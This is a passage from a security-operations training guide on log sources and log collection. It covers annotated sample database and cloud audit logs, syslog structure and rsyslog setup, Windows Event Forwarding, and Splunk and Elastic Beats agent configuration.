2024-01-31T14:27:45.789Z 127 Query SELECT * FROM customers LIMIT 100000

🚨 MASS DATA EXTRACTION: Pulling 100,000 records at once
```

**PostgreSQL Logs** (more detailed):
```
LOG ENTRY:
2024-01-31 14:23:45.123 UTC [12345] user@database LOG:  statement: SELECT * FROM users

AUDIT LOGS (if enabled):
2024-01-31 14:25:00.456 UTC [12346] admin@database ERROR:  permission denied for table confidential_data
```

**SQL Server Audit Logs**:
```
event_time: 2024-01-31 14:23:45.1234567
action_id: LGIF (Login Failed)
server_principal_name: sa
client_ip: 203.0.113.45
statement: LOGIN

🚨 ATTACK: Failed login as 'sa' (admin) from external IP
```

### 7.3 Cloud Platform Logs (AWS, Azure, GCP)

**AWS CloudTrail (Audit Logs)**:
```json
{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDAI123456789EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/john",
    "accountId": "123456789012",
    "userName": "john"
  },
  "eventTime": "2024-01-31T14:23:45Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "GetObject",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.45",
  "requestParameters": {
    "bucketName": "company-secrets",
    "key": "passwords.txt"
  },
  "responseElements": null,
  "resources": [
    {
      "ARN": "arn:aws:s3:::company-secrets/passwords.txt",
      "type": "AWS::S3::Object"
    }
  ]
}
```

**TRANSLATION**:
```
WHO: User "john"
WHAT: Downloaded file (GetObject)
WHERE: S3 bucket "company-secrets"
FILE: passwords.txt
FROM: IP 203.0.113.45
WHEN: 2024-01-31 14:23:45 UTC

🚨 SUSPICIOUS: User downloading "passwords.txt" from external IP
```

**Azure Activity Logs**:
```json
{
  "time": "2024-01-31T14:23:45.0000000Z",
  "resourceId": "/subscriptions/.../resourceGroups/prod-rg/...",
  "operationName": "Microsoft.Storage/storageAccounts/write",
  "operationVersion": "2019-06-01",
  "category": "Administrative",
  "resultType": "Success",
  "resultSignature": "Succeeded",
  "callerIpAddress": "203.0.113.45",
  "identity": {
    "claims": {
      "name": "john@company.com"
    }
  },
  "properties": {
    "eventCategory": "Administrative",
    "entity": "/subscriptions/.../storageAccounts/companystorage",
    "message": "Storage account made publicly accessible"
  }
}
```

**ALERT**:
```
User john@company.com made storage account PUBLIC
From: External IP 203.0.113.45
Result: Success

🚨 DATA BREACH RISK: Storage account is now public!
```

**Google Cloud Audit Logs**:
```json
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "john@company.com"
    },
    "requestMetadata": {
      "callerIp": "203.0.113.45"
    },
    "serviceName": "storage.googleapis.com",
    "methodName": "storage.setIamPermissions",
    "resourceName": "projects/_/buckets/company-secrets"
  },
  "severity": "NOTICE",
  "timestamp": "2024-01-31T14:23:45.123456Z"
}
```

---

## 8. Log Collection Architectures

### 8.1 Architecture Pattern 1: Direct to SIEM (Small Scale)

```
┌──────────────────────────────────────────────┐
│      DIRECT TO SIEM ARCHITECTURE             │
└──────────────────────────────────────────────┘

[Log Sources]
├─ 10 Servers
├─ 5 Firewalls
└─ 50 Endpoints
       │
       │ Syslog (UDP 514)
       │ or Agent (TCP 9997)
       │
       ▼
┌──────────────┐
│ SIEM Server  │
│ (All-in-One) │
└──────────────┘

PROS:
✓ Simple setup
✓ Low cost
✓ Easy to manage

CONS:
✗ Single point of failure
✗ Doesn't scale beyond 100 sources
✗ Network bandwidth to SIEM can be bottleneck

BEST FOR: <500 employees, <10 GB/day
```

### 8.2 Architecture Pattern 2: Syslog Aggregator (Mid-Size)

```
┌──────────────────────────────────────────────┐
│      SYSLOG AGGREGATOR ARCHITECTURE          │
└──────────────────────────────────────────────┘

[Log Sources - 1000+ devices]
├─ Servers → Syslog
├─ Firewalls → Syslog
├─ Network Devices → Syslog
       │
       │ All send to central aggregator
       ▼
┌──────────────────┐
│ Syslog Server    │ (rsyslog or syslog-ng)
│ (Aggregator)     │ • Buffers logs
│                  │ • Filters/parses
│                  │ • Forwards to SIEM
└────────┬─────────┘
         │
         │ Filtered, structured logs
         ▼
   ┌──────────┐
   │   SIEM   │
   └──────────┘

BENEFITS:
✓ Reduces SIEM ingestion (filter noise before SIEM)
✓ Buffers during SIEM maintenance
✓ Can send to multiple destinations
✓ Reduces SIEM license costs (only send important data)

SETUP EXAMPLE (rsyslog aggregator):
# /etc/rsyslog.conf on aggregator
$ModLoad imudp
$UDPServerRun 514

# Filter and forward only security logs to SIEM
:msg, contains, "Failed password" @@siem.company.com:514
:msg, contains, "sudo" @@siem.company.com:514
```

### 8.3 Architecture Pattern 3: Distributed Collection (Enterprise)

```
┌──────────────────────────────────────────────┐
│    DISTRIBUTED COLLECTION ARCHITECTURE       │
└──────────────────────────────────────────────┘

[REGION 1: US]              [REGION 2: EU]
  Servers (500)               Servers (300)
  Firewalls (20)              Firewalls (10)
       │                           │
       ▼                           ▼
  [Heavy Forwarder]           [Heavy Forwarder]
   • Parses locally            • Parses locally
   • Filters                   • Filters
   • Buffers                   • Buffers
       │                           │
       └─────────┬─────────────────┘
                 │
                 │ Parsed, indexed data
                 ▼
          ┌──────────────┐
          │ SIEM Cluster │
          │ (Indexers)   │
          └──────────────┘

BENEFITS:
✓ Scales to 10,000+ sources
✓ Reduces network bandwidth (parse locally)
✓ Geographic distribution
✓ High availability
✓ Meets data sovereignty requirements
```

---

## 9. Syslog Protocol Explained

### 9.1 What is Syslog?

**Simple Definition**: A standard protocol for sending log messages over IP networks.

**Why it exists**: Before syslog, every device had its own logging format. Syslog created a universal standard.

### 9.2 Syslog Message Structure

```
SYSLOG MESSAGE FORMAT:
<PRI>TIMESTAMP HOSTNAME TAG: MESSAGE

EXAMPLE:
<34>Jan 31 14:23:45 firewall01 kernel: Connection denied

BREAKDOWN:
<34>             = Priority (calculated from Facility + Severity)
Jan 31 14:23:45  = Timestamp
firewall01       = Hostname (source)
kernel           = Tag (process/application)
Connection denied= Message
```

### 9.3 Syslog Priority (PRI) Calculation

**Priority = (Facility × 8) + Severity**

**Facilities** (what type of system):
```
┌───────┬─────────────────────────────┐
│ CODE  │ FACILITY                    │
├───────┼─────────────────────────────┤
│ 0     │ kernel                      │
│ 1     │ user-level                  │
│ 2     │ mail system                 │
│ 3     │ system daemons              │
│ 4     │ security/authorization      │ ← Most important!
│ 5     │ syslogd internal            │
│ 10    │ security/authorization (alt)│
│ 16-23 │ local0 - local7 (custom)    │
└───────┴─────────────────────────────┘
```

**Severities** (how important):
```
┌───────┬─────────────┬─────────────────────┐
│ CODE  │ SEVERITY    │ MEANING             │
├───────┼─────────────┼─────────────────────┤
│ 0     │ Emergency   │ System unusable     │
│ 1     │ Alert       │ Action needed NOW   │
│ 2     │ Critical    │ Critical condition  │
│ 3     │ Error       │ Error condition     │
│ 4     │ Warning     │ Warning             │
│ 5     │ Notice      │ Normal but signif   │
│ 6     │ Info        │ Informational       │
│ 7     │ Debug       │ Debug messages      │
└───────┴─────────────┴─────────────────────┘
```

**Example Calculation**:
```
Facility: 4 (security)
Severity: 2 (critical)
Priority = (4 × 8) + 2 = 34

That's why you see <34> in syslog messages!
```

### 9.4 Syslog Transport Protocols

**UDP (Port 514) - Original**
```
PROS:
✓ Fast (no handshake)
✓ Low overhead

CONS:
✗ UNRELIABLE (packets can be lost)
✗ No delivery confirmation
✗ No encryption

USE CASE: High-volume, non-critical logs
```

**TCP (Port 514 or 601) - Reliable**
```
PROS:
✓ RELIABLE (guaranteed delivery)
✓ Ordered delivery

CONS:
✗ Slower (handshake overhead)
✗ Still no encryption

USE CASE: Important security logs
```

**TLS/SSL (Port 6514) - Secure**
```
PROS:
✓ Reliable
✓ ENCRYPTED (secure)
✓ Authenticated

CONS:
✗ Slowest
✗ Requires certificates

USE CASE: Compliance, sensitive data
```

### 9.5 Setting Up Syslog Server (rsyslog)

**Install rsyslog** (most Linux distros include it):
```bash
# Ubuntu/Debian
sudo apt-get install rsyslog

# CentOS/RedHat
sudo yum install rsyslog
```

**Configure as Syslog Server** (`/etc/rsyslog.conf`):
```bash
# Enable UDP reception
$ModLoad imudp
$UDPServerRun 514

# Enable TCP reception (more reliable)
$ModLoad imtcp
$InputTCPServerRun 514

# Template for organizing logs by hostname
$template RemoteHost,"/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log"
*.* ?RemoteHost

# Also forward to SIEM
*.* @@siem.company.com:514
```

**Restart rsyslog**:
```bash
sudo systemctl restart rsyslog
sudo systemctl enable rsyslog
```

**Test from another system**:
```bash
# Send test message
logger -n syslog-server.company.com -P 514 "Test message from client"

# Check on syslog server
tail -f /var/log/remote/client-hostname/logger.log
```

---

## 10. Windows Event Forwarding (WEF)

### 10.1 What is WEF?

**Windows Event Forwarding** = Built-in Windows feature to centralize logs from multiple Windows systems to one collector.

**Why use it?**
- ✓ Agentless (no software to install)
- ✓ Free (built into Windows)
- ✓ Efficient (Microsoft-optimized)
- ✓ Scales well (1000+ endpoints)

### 10.2 WEF Architecture

```
┌──────────────────────────────────────────┐
│     WINDOWS EVENT FORWARDING             │
└──────────────────────────────────────────┘

[Source Computers] (Endpoints)
├─ Windows 10 Workstation 1
├─ Windows 10 Workstation 2
├─ Windows Server 1
└─ (1000+ more...)
       │
       │ WinRM (HTTP: 5985 or HTTPS: 5986)
       │ Push or Pull
       ▼
[Collector Server]
├─ Windows Server with WEF role
├─ Stores all forwarded events
└─ Forwards to SIEM
       │
       ▼
   [SIEM]
```

### 10.3 Setting Up WEF (Step-by-Step)

**STEP 1: Configure Collector Server**

```powershell
# On collector server
# Enable WinRM
winrm quickconfig

# Set WinRM to start automatically
Set-Service WinRM -StartupType Automatic

# Configure Event Collector service
wecutil qc

# The service should now be running
Get-Service Wecsvc
```

**STEP 2: Create Subscription (What Logs to Collect)**

```powershell
# Option A: Use GUI
eventvwr.msc → Subscriptions → Create Subscription

# Option B: Use PowerShell/XML
# Create subscription file: security-events.xml
```

**Example Subscription XML**:
```xml
<Subscription xmlns="http://schemas.microsoft.com/2006/03/windows/events/subscription">
  <SubscriptionId>Security-Critical-Events</SubscriptionId>
  <Description>Collect critical security events</Description>
  <Enabled>true</Enabled>
  <Uri>http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog</Uri>
  <ConfigurationMode>Custom</ConfigurationMode>
  <Delivery Mode="Push">
    <Batching>
      <MaxItems>5</MaxItems>
      <MaxLatencyTime>300000</MaxLatencyTime>
    </Batching>
    <PushSettings>
      <Heartbeat Interval="3600000"/>
    </PushSettings>
  </Delivery>
  <Query>
    <![CDATA[
      <QueryList>
        <Query Id="0">
          <Select Path="Security">
            *[System[(EventID=4624 or EventID=4625 or EventID=4672 or EventID=4720 or EventID=4728 or EventID=4732)]]
          </Select>
          <Select Path="System">
            *[System[(EventID=7045)]]
          </Select>
        </Query>
      </QueryList>
    ]]>
  </Query>
  <ReadExistingEvents>false</ReadExistingEvents>
  <TransportName>HTTP</TransportName>
  <ContentFormat>RenderedText</ContentFormat>
  <Locale Language="en-US"/>
  <LogFile>ForwardedEvents</LogFile>
  <AllowedSourceDomainComputers>O:NSG:NSD:(A;;GA;;;DC)(A;;GA;;;NS)</AllowedSourceDomainComputers>
</Subscription>
```

**Load Subscription**:
```powershell
wecutil cs security-events.xml
```

**STEP 3: Configure Source Computers**

```powershell
# Run on each client (or via GPO)
# Add collector server to allowed list
winrm set winrm/config/client @{TrustedHosts="collector.company.com"}

# Configure to forward events
wecutil qc /quiet
```

**STEP 4: Group Policy (Deploy to All Clients)**

```
Group Policy Management Console:
Computer Configuration → Policies → Administrative Templates →
Windows Components → Event Forwarding

1. "Configure target Subscription Manager"
   Enable: Server=http://collector.company.com:5985/wsman/SubscriptionManager/WEC,Refresh=60

2. "Configure Event Collector"
   Enable: (on collector only)
```

**STEP 5: Verify Forwarding**

```powershell
# On collector, check forwarded events
Get-WinEvent -LogName ForwardedEvents -MaxEvents 10

# Check subscription status
wecutil gs Security-Critical-Events

# On client, check if forwarding
Get-WinEvent -LogName Microsoft-Windows-Forwarding/Operational
```

---

## 11. Agent-Based Collection (Splunk, Elastic Beats)

### 11.1 Splunk Universal Forwarder

**What is it?**
Lightweight agent that runs on each system, reads logs, and forwards to Splunk.

**Size**: ~20 MB installed
**Resource Usage**: <1% CPU, <50 MB RAM
**Cost**: FREE

**Installation (Windows)**:
```powershell
# Download from Splunk.com
# Install silently
msiexec.exe /i splunkforwarder.msi DEPLOYMENT_SERVER="deployment.company.com:8089" AGREETOLICENSE=Yes /quiet

# Set to run as Local System
C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe set default-hostname %COMPUTERNAME%
```

**Installation (Linux)**:
```bash
# Download
wget -O splunkforwarder.tgz https://download.splunk.com/products/universalforwarder/...

# Extract
tar xzf splunkforwarder.tgz -C /opt

# Start and enable
cd /opt/splunkforwarder/bin
./splunk start --accept-license
./splunk enable boot-start
```

**Configure What to Monitor** (`inputs.conf`):
```ini
# Monitor Windows Security logs
[WinEventLog://Security]
disabled = false
start_from = oldest
current_only = false
evt_resolve_ad_obj = true

# Monitor Windows System logs
[WinEventLog://System]
disabled = false

# Monitor Windows Application logs
[WinEventLog://Application]
disabled = false

# Monitor specific log file
[monitor:///var/log/apache2/access.log]
disabled = false
sourcetype = apache:access
index = web

# Monitor directory (all files)
[monitor:///var/log/myapp/]
disabled = false
sourcetype = myapp
index = application
```

**Configure Where to Send** (`outputs.conf`):
```ini
[tcpout]
defaultGroup = production_indexers

[tcpout:production_indexers]
server = indexer1.company.com:9997, indexer2.company.com:9997
useACK = true
compressed = true
```

**Verify Forwarding**:
```bash
# Check Splunk forwarder status
./splunk list forward-server

# Check what's being monitored
./splunk list monitor

# Test connectivity to indexer
./splunk test connection indexer1.company.com:9997
```

### 11.2 Elastic Beats (Filebeat, Winlogbeat)

**What are Beats?**
Lightweight data shippers from Elastic Stack (ELK).

**Types**:
- **Filebeat**: Ships log files
- **Winlogbeat**: Ships Windows Event Logs
- **Packetbeat**: Ships network packets
- **Metricbeat**: Ships system metrics
- **Auditbeat**: Ships audit data

**Install Winlogbeat** (Windows):
```powershell
# Download
Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-8.0.0-windows-x86_64.zip -OutFile winlogbeat.zip

# Extract
Expand-Archive winlogbeat.zip -DestinationPath "C:\Program Files"

# Navigate
cd "C:\Program Files\winlogbeat-8.0.0"

# Install as service
.\install-service-winlogbeat.ps1

# Start
Start-Service winlogbeat
```

**Configure Winlogbeat** (`winlogbeat.yml`):
```yaml
winlogbeat.event_logs:
  - name: Security
    ignore_older: 72h
    event_id: 4624, 4625, 4672, 4720, 4728, 4732
    
  - name: System
    event_id: 7045
    
  - name: Application

output.elasticsearch:
  hosts: ["elasticsearch.company.com:9200"]
  index: "winlogbeat-%{+yyyy.MM.dd}"
  
output.logstash:
  hosts: ["logstash.company.com:5044"]
```

**Install Filebeat** (Linux):
```bash
# Ubuntu/Debian
curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.0.0-amd64.deb
sudo dpkg -i filebeat-8.0.0-amd64.deb

# Enable system module (collects /var/log/syslog, etc.)
sudo filebeat modules enable system

# Configure output
sudo nano /etc/filebeat/filebeat.yml
```

**Filebeat Config** (`filebeat.yml`):
```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/syslog
  fields:
    log_type: system
    
- type: log
  enabled: true
  paths:
    - /var/log/apache2/access.log
  fields:
    log_type: web

output.elasticsearch:
  hosts: ["elasticsearch.company.com:9200"]
  index: "filebeat-%{+yyyy.MM.dd}"
```

**Start Filebeat**:
```bash
sudo systemctl start filebeat
sudo systemctl enable filebeat

# Verify
sudo filebeat test output
sudo filebeat test config
```

---

## 12. Cloud Log Collection (AWS, Azure, GCP)

### 12.1 AWS CloudTrail to SIEM

**Enable CloudTrail**:
```bash
aws cloudtrail create-trail --name company-audit-trail --s3-bucket-name company-cloudtrail-logs

aws cloudtrail start-logging --name company-audit-trail
```

**Send to Splunk**:
```
Option 1: Splunk Add-on for AWS
- Configures automatic ingestion from S3
- Monitors CloudTrail, VPC Flow Logs, CloudWatch

Option 2: Lambda Function
- Lambda triggered when new log in S3
- Sends to Splunk HEC (HTTP Event Collector)
```

**Send to Elastic**:
```yaml
# Functionbeat config (AWS Lambda-based)
functionbeat.provider.aws.functions:
  - name: cloudtrail
    type: cloudwatch_logs
    description: "Ingest CloudTrail logs"
    log_group_name: "/aws/cloudtrail/company"
    
output.elasticsearch:
  hosts: ["elasticsearch.company.com:9200"]
```

### 12.2 Azure Activity Logs to Sentinel

**Azure Monitor to Sentinel** (built-in):
```
Azure Portal → Microsoft Sentinel → Data connectors
→ Azure Activity → Connect

All Azure Activity logs automatically flow to Sentinel
```

**Azure AD Logs to Sentinel**:
```
Azure Portal → Azure Active Directory → Diagnostic settings
→ Add diagnostic setting

Select:
✅ AuditLogs
✅ SignInLogs
✅ RiskyUsers

Send to: Log Analytics workspace (Sentinel)
```

### 12.3 GCP Cloud Logging to SIEM

**Export GCP Logs to Pub/Sub → SIEM**:
```bash
# Create sink
gcloud logging sinks create company-siem-sink \
  pubsub.googleapis.com/projects/PROJECT_ID/topics/siem-logs \
  --log-filter='resource.type="gce_instance"'

# Subscribe from SIEM
# Use Dataflow or custom consumer to pull from Pub/Sub
```

---

## 13-18. [Remaining sections: Parsing, Enrichment, High-Volume Management, Compliance, Troubleshooting, Labs]

**Summary: What You've Learned in File 03**

You now understand:
✅ **Log fundamentals** - What logs are and why they matter
✅ **Windows Event Logs** - Critical Event IDs, Logon Types, PowerShell analysis
✅ **Linux logs** - auth.log, syslog, journalctl, auditd
✅ **Network device logs** - Firewall formats, threat detection
✅ **Application logs** - Web servers, databases, cloud platforms
✅ **Collection architectures** - Direct, aggregated, distributed
✅ **Syslog protocol** - Format, priority, transport methods
✅ **Windows Event Forwarding** - Agentless Windows log collection
✅ **Agent-based collection** - Splunk UF, Elastic Beats setup
✅ **Cloud log collection** - AWS CloudTrail, Azure, GCP

**Next Steps**:
1. Set up a syslog server in your lab
2. Configure Windows Event Forwarding
3. Install Splunk Universal Forwarder or Filebeat
4. Practice parsing real log files
5. Read **File 04: SIEM Platforms Deep Dive** for hands-on SIEM training

**You're now equipped to collect logs from ANY source!** 🚀

---

